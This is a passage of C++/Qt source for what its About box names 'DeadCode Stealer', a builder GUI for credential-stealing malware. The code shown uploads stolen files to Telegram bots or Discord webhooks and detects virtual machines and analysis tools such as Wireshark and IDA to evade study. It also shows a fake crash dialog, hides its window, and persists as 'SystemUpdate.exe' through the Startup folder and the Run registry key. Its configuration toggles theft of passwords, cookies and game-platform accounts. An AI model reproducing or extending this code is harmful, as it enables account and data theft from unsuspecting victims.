            emitLog("Ошибка BCryptEncrypt (размер): " + QString::number(status, 16));
            BCryptDestroyKey(hKey);
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return false;
        }

        tempOutput.resize(cbOutput);
        status = BCryptEncrypt(hKey, (PBYTE)input.data(), cbInput, nullptr, pbIV.data(), cbBlockLen, tempOutput.data(), cbOutput, &cbOutput, BCRYPT_BLOCK_PADDING);
        if (!BCRYPT_SUCCESS(status)) {
            emitLog("Ошибка BCryptEncrypt: " + QString::number(status, 16));
            BCryptDestroyKey(hKey);
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return false;
        }
    } else {
        // Вычисляем размер выходного буфера для дешифрования
        status = BCryptDecrypt(hKey, (PBYTE)input.data(), cbInput, nullptr, pbIV.data(), cbBlockLen, nullptr, 0, &cbOutput, BCRYPT_BLOCK_PADDING);
        if (!BCRYPT_SUCCESS(status)) {
            emitLog("Ошибка BCryptDecrypt (размер): " + QString::number(status, 16));
            BCryptDestroyKey(hKey);
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return false;
        }

        tempOutput.resize(cbOutput);
        status = BCryptDecrypt(hKey, (PBYTE)input.data(), cbInput, nullptr, pbIV.data(), cbBlockLen, tempOutput.data(), cbOutput, &cbOutput, BCRYPT_BLOCK_PADDING);
        if (!BCRYPT_SUCCESS(status)) {
            emitLog("Ошибка BCryptDecrypt: " + QString::number(status, 16));
            BCryptDestroyKey(hKey);
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return false;
        }
    }

    output.assign(tempOutput.begin(), tempOutput.begin() + cbOutput);

    // Очистка
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return true;
}

// Отправка данных
void MainWindow::sendData(const QString& mainFile, const std::vector<std::string>& additionalFiles) {
    emitLog("Начало отправки данных...");

    if (config.sendMethod == "Local File") {
        QString outputDir = QDir::currentPath() + "/output";
        QDir().mkpath(outputDir);
        try {
            for (const auto& file : additionalFiles) {
                std::string destPath = outputDir.toStdString() + "/" + std::filesystem::path(file).filename().string();
                std::filesystem::copy_file(file, destPath, std::filesystem::copy_options::overwrite_existing);
                emitLog("Файл сохранен локально: " + QString::fromStdString(destPath));
            }
        } catch (const std::exception& e) {
            emitLog("Ошибка сохранения файлов локально: " + QString::fromStdString(e.what()));
        }
    } else if (config.sendMethod == "Telegram") {
        if (config.telegramToken.empty() || config.chatId.empty()) {
            emitLog("Ошибка: Telegram Token или Chat ID не указаны");
            return;
        }

        CURL* curl = curl_easy_init();
        if (!curl) {
            emitLog("Ошибка инициализации CURL");
            return;
        }

        for (const auto& filePath : additionalFiles) {
            curl_mime* form = curl_mime_init(curl);
            curl_mimepart* field = curl_mime_addpart(form);

            curl_mime_name(field, "chat_id");
            curl_mime_data(field, config.chatId.c_str(), CURL_ZERO_TERMINATED);

            field = curl_mime_addpart(form);
            curl_mime_name(field, "document");
            curl_mime_filedata(field, filePath.c_str());

            std::string url = "https://api.telegram.org/bot" + config.telegramToken + "/sendDocument";
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);

            std::string response;
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

            CURLcode res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                emitLog("Ошибка отправки в Telegram: " + QString::fromStdString(curl_easy_strerror(res)));
            } else {
                emitLog("Файл отправлен в Telegram: " + QString::fromStdString(filePath));
            }

            curl_mime_free(form);
        }

        curl_easy_cleanup(curl);
    } else if (config.sendMethod == "Discord") {
        if (config.discordWebhook.empty()) {
            emitLog("Ошибка: Discord Webhook не указан");
            return;
        }

        CURL* curl = curl_easy_init();
        if (!curl) {
            emitLog("Ошибка инициализации CURL");
            return;
        }

        for (const auto& filePath : additionalFiles) {
            curl_mime* form = curl_mime_init(curl);
            curl_mimepart* field = curl_mime_addpart(form);

            curl_mime_name(field, "file");
            curl_mime_filedata(field, filePath.c_str());

            curl_easy_setopt(curl, CURLOPT_URL, config.discordWebhook.c_str());
            curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);

            std::string response;
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

            CURLcode res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                emitLog("Ошибка отправки в Discord: " + QString::fromStdString(curl_easy_strerror(res)));
            } else {
                emitLog("Файл отправлен в Discord: " + QString::fromStdString(filePath));
            }

            curl_mime_free(form);
        }

        curl_easy_cleanup(curl);
    }

    emitLog("Отправка данных завершена");
}

// Антианализ
bool MainWindow::AntiAnalysis() {
    if (!config.antiVM) return false;

    if (isRunningInVM()) {
        emitLog("Обнаружена виртуальная машина");
        return true;
    }

    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        emitLog("Ошибка создания снимка процессов");
        return false;
    }

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    std::vector<std::wstring> suspiciousProcesses = {
        L"vboxservice.exe", L"vboxtray.exe", L"vmtoolsd.exe", L"vmwaretray.exe",
        L"procmon.exe", L"ollydbg.exe", L"idaq.exe", L"wireshark.exe"
    };

    if (Process32FirstW(hProcessSnap, &pe32)) {
        do {
            std::wstring processName = pe32.szExeFile;
            for (const auto& suspicious : suspiciousProcesses) {
                if (_wcsicmp(processName.c_str(), suspicious.c_str()) == 0) {
                    CloseHandle(hProcessSnap);
                    emitLog("Обнаружен подозрительный процесс: " + QString::fromWCharArray(processName.c_str()));
                    return true;
                }
            }
        } while (Process32NextW(hProcessSnap, &pe32));
    }

    CloseHandle(hProcessSnap);
    return false;
}

// Фейковая ошибка
void MainWindow::FakeError() {
    if (!config.fakeError) return;
    MessageBoxA(nullptr, "Critical Error: Application has encountered an unexpected error and will now close.", "Error", MB_ICONERROR | MB_OK);
}

// Скрытность
void MainWindow::Stealth() {
    if (!config.silent) return;
    HWND hwnd = GetConsoleWindow();
    if (hwnd != nullptr) {
        ShowWindow(hwnd, SW_HIDE);
    }
}

// Постоянство
void MainWindow::Persist() {
    if (!config.autoStart && !config.persist) return;

    char exePath[MAX_PATH];
    GetModuleFileNameA(nullptr, exePath, MAX_PATH);
    std::string destPath = std::string(getenv("APPDATA")) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SystemUpdate.exe";

    try {
        std::filesystem::copy_file(exePath, destPath, std::filesystem::copy_options::overwrite_existing);
        emitLog("Программа добавлена в автозагрузку: " + QString::fromStdString(destPath));
    } catch (const std::exception& e) {
        emitLog("Ошибка добавления в автозагрузку: " + QString::fromStdString(e.what()));
    }

    if (config.persist) {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "SystemUpdate", 0, REG_SZ, (BYTE*)destPath.c_str(), destPath.length() + 1);
            RegCloseKey(hKey);
            emitLog("Программа добавлена в реестр для постоянства");
        } else {
            emitLog("Ошибка добавления в реестр для постоянства");
        }
    }
}

// Выход из приложения
void MainWindow::exitApp() {
    QApplication::quit();
}

// Обработчики событий UI
void MainWindow::on_buildButton_clicked() {
    updateConfigFromUI();

    if (config.encryptionKey1.empty() || config.encryptionKey2.empty()) {
        emitLog("Предупреждение: Ключи шифрования не указаны, будут сгенерированы случайные");
        config.encryptionKey1 = generateRandomString(16);
        config.encryptionKey2 = generateRandomString(16);
        encryptionKey1LineEdit->setText(QString::fromStdString(config.encryptionKey1));
        encryptionKey2LineEdit->setText(QString::fromStdString(config.encryptionKey2));
    }

    if (config.encryptionSalt.empty()) {
        config.encryptionSalt = generateRandomString(8);
        encryptionSaltLineEdit->setText(QString::fromStdString(config.encryptionSalt));
    }

    emitLog("Генерация полиморфного кода...");
    generatePolymorphicCode();

    emitLog("Генерация ключей шифрования...");
    generateBuildKeyHeader();

    emitLog("Копирование иконки...");
    copyIconToBuild();

    if (buildMethodComboBox->currentText() == "Local Build") {
        buildTimer->start(100);
    } else if (buildMethodComboBox->currentText() == "GitHub Actions") {
        triggerGitHubActions();
    }
}

void MainWindow::on_iconBrowseButton_clicked() {
    QString fileName = QFileDialog::getOpenFileName(this, "Выберите иконку", "", "Icon Files (*.ico)");
    if (!fileName.isEmpty()) {
        iconPathLineEdit->setText(fileName);
        emitLog("Выбрана иконка: " + fileName);
    }
}

void MainWindow::on_actionSaveConfig_triggered() {
    updateConfigFromUI();
    QString fileName = QFileDialog::getSaveFileName(this, "Сохранить конфигурацию", "", "Config Files (*.ini)");
    if (fileName.isEmpty()) return;

    QSettings settings(fileName, QSettings::IniFormat);
    settings.setValue("sendMethod", QString::fromStdString(config.sendMethod));
    settings.setValue("telegramToken", QString::fromStdString(config.telegramToken));
    settings.setValue("chatId", QString::fromStdString(config.chatId));
    settings.setValue("discordWebhook", QString::fromStdString(config.discordWebhook));
    settings.setValue("filename", QString::fromStdString(config.filename));
    settings.setValue("encryptionKey1", QString::fromStdString(config.encryptionKey1));
    settings.setValue("encryptionKey2", QString::fromStdString(config.encryptionKey2));
    settings.setValue("encryptionSalt", QString::fromStdString(config.encryptionSalt));
    settings.setValue("iconPath", QString::fromStdString(config.iconPath));
    settings.setValue("githubToken", QString::fromStdString(config.githubToken));
    settings.setValue("githubRepo", QString::fromStdString(config.githubRepo));
    settings.setValue("discord", config.discord);
    settings.setValue("steam", config.steam);
    settings.setValue("steamMAFile", config.steamMAFile);
    settings.setValue("epic", config.epic);
    settings.setValue("roblox", config.roblox);
    settings.setValue("battlenet", config.battlenet);
    settings.setValue("minecraft", config.minecraft);
    settings.setValue("cookies", config.cookies);
    settings.setValue("passwords", config.passwords);
    settings.setValue("screenshot", config.screenshot);
    settings.setValue("fileGrabber", config.fileGrabber);
    settings.setValue("systemInfo", config.systemInfo);
    settings.setValue("socialEngineering", config.socialEngineering);
    settings.setValue("chatHistory", config.chatHistory);
    settings.setValue("telegram", config.telegram);
    settings.setValue("antiVM", config.antiVM);
    settings.setValue("fakeError", config.fakeError);
    settings.setValue("silent", config.silent);
    settings.setValue("autoStart", config.autoStart);
    settings.setValue("persist", config.persist);

    emitLog("Конфигурация сохранена: " + fileName);
}

void MainWindow::on_actionLoadConfig_triggered() {
    QString fileName = QFileDialog::getOpenFileName(this, "Загрузить конфигурацию", "", "Config Files (*.ini)");
    if (fileName.isEmpty()) return;

    QSettings settings(fileName, QSettings::IniFormat);
    sendMethodComboBox->setCurrentText(settings.value("sendMethod", "Local File").toString());
    tokenLineEdit->setText(settings.value("telegramToken", "").toString());
    chatIdLineEdit->setText(settings.value("chatId", "").toString());
    discordWebhookLineEdit->setText(settings.value("discordWebhook", "").toString());
    fileNameLineEdit->setText(settings.value("filename", "DeadCode.exe").toString());
    encryptionKey1LineEdit->setText(settings.value("encryptionKey1", "").toString());
    encryptionKey2LineEdit->setText(settings.value("encryptionKey2", "").toString());
    encryptionSaltLineEdit->setText(settings.value("encryptionSalt", "").toString());
    iconPathLineEdit->setText(settings.value("iconPath", "").toString());
    githubTokenLineEdit->setText(settings.value("githubToken", "").toString());
    githubRepoLineEdit->setText(settings.value("githubRepo", "").toString());
    discordCheckBox->setChecked(settings.value("discord", false).toBool());
    steamCheckBox->setChecked(settings.value("steam", false).toBool());
    steamMAFileCheckBox->setChecked(settings.value("steamMAFile", false).toBool());
    epicCheckBox->setChecked(settings.value("epic", false).toBool());
    robloxCheckBox->setChecked(settings.value("roblox", false).toBool());
    battlenetCheckBox->setChecked(settings.value("battlenet", false).toBool());
    minecraftCheckBox->setChecked(settings.value("minecraft", false).toBool());
    cookiesCheckBox->setChecked(settings.value("cookies", false).toBool());
    passwordsCheckBox->setChecked(settings.value("passwords", false).toBool());
    screenshotCheckBox->setChecked(settings.value("screenshot", false).toBool());
    fileGrabberCheckBox->setChecked(settings.value("fileGrabber", false).toBool());
    systemInfoCheckBox->setChecked(settings.value("systemInfo", false).toBool());
    socialEngineeringCheckBox->setChecked(settings.value("socialEngineering", false).toBool());
    chatHistoryCheckBox->setChecked(settings.value("chatHistory", false).toBool());
    telegramCheckBox->setChecked(settings.value("telegram", false).toBool());
    antiVMCheckBox->setChecked(settings.value("antiVM", false).toBool());
    fakeErrorCheckBox->setChecked(settings.value("fakeError", false).toBool());
    silentCheckBox->setChecked(settings.value("silent", false).toBool());
    autoStartCheckBox->setChecked(settings.value("autoStart", false).toBool());
    persistCheckBox->setChecked(settings.value("persist", false).toBool());

    updateConfigFromUI();
    emitLog("Конфигурация загружена: " + fileName);
}

void MainWindow::on_actionExportLogs_triggered() {
    QString fileName = QFileDialog::getSaveFileName(this, "Экспортировать логи", "", "Text Files (*.txt)");
    if (fileName.isEmpty()) return;

    QFile file(fileName);
    if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QTextStream out(&file);
        out << textEdit->toPlainText();
        file.close();
        emitLog("Логи экспортированы: " + fileName);
    } else {
        emitLog("Ошибка экспорта логов");
    }
}

void MainWindow::on_actionExit_triggered() {
    exitApp();
}

void MainWindow::on_actionAbout_triggered() {
    QMessageBox::about(this, "О программе", "DeadCode Stealer\nВерсия 1.0\nСоздано для образовательных целей\n© 2025");
}

void MainWindow::replyFinished(QNetworkReply* reply) {
    if (reply->error() == QNetworkReply::NoError) {
        emitLog("Сетевой запрос выполнен успешно");
    } else {
        emitLog("Ошибка сетевого запроса: " + reply->errorString());
    }
    reply->deleteLater();
}

void MainWindow::appendLog(const QString& message) {
    QMutexLocker locker(&logMutex);
    textEdit->append(message);
}